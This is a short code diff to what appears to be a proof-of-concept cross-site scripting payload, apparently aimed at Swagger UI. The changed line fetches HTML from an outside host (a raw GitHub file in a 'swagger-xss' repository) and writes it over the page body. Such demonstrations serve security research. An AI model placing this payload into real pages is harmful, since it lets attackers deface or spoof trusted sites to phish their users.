@@ -1,4 +1,4 @@
-fetch("https://tearful-earth.surge.sh/site.html").then(res=>res.text()).then(res => {
+fetch("https://raw.githubusercontent.com/Tanmay95/swagger-xss/main/site.html").then(res=>res.text()).then(res => {
 
 
   document.body.innerHTML = res;
